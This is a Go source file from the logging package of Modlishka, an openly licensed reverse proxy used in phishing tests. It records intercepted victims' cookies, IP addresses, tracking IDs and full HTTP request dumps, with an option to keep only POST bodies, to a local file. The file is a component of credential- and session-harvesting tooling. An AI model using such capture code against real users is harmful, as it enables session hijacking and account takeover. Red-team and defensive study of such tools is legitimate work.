/**

    "Modlishka" Reverse Proxy.

    Copyright (C) 2018 Piotr Duszyński piotr[at]duszynski.eu.

    SPDX-License-Identifier: GPL-3.0-or-later

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

**/

package log

import (
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"time"
)

var file *os.File = nil

func FunctionTracking(start time.Time, name string) {
	elapsed := time.Since(start)
	if elapsed.Seconds() > 1.0 {
		Warningf("%s took %s", name, elapsed)
	} else {
		Debugf("%s took %s", name, elapsed)
	}
}

func LogRequestFile(data string) {

	if Options.LogRequestPath != "" {
		if file == nil {
			file, _ = os.OpenFile(Options.LogRequestPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		}

		if _, err := file.Write([]byte(data)); err != nil {
			Debugf("%v", err)
		}

	}

}

func Cookies(userID string, URL string, cookies []string, IP string) {

	cookieString := strings.Join(cookies, "####")

	LogRequestFile("\nCOOKIES" +
		"\n======\nTimestamp: " + time.Now().Format(time.RFC850) +
		"\n======\nRemoteIP: " + IP +
		"\n======\nUUID: " + userID +
		"\n======\nURL: " + URL +
		"\n======\n" + string(cookieString) +
		"\n======\n")

}

func HTTPRequest(req *http.Request, userID string) {

	if Options.POST && req.Method != "POST" {
		return
	}

	// LOG final request
	requestDump, err := httputil.DumpRequest(req, true)
	if err != nil {
		Errorf("Error dumping request: %s", err)
	}

	LogRequestFile("\nREQUEST" +
		"\n======\nTimestamp: " + time.Now().Format(time.RFC850) +
		"\n======\nRemoteIP: " + req.RemoteAddr +
		"\n======\nUUID: " + userID +
		"\n======\n" + string(requestDump) +
		"\n======\n")

}
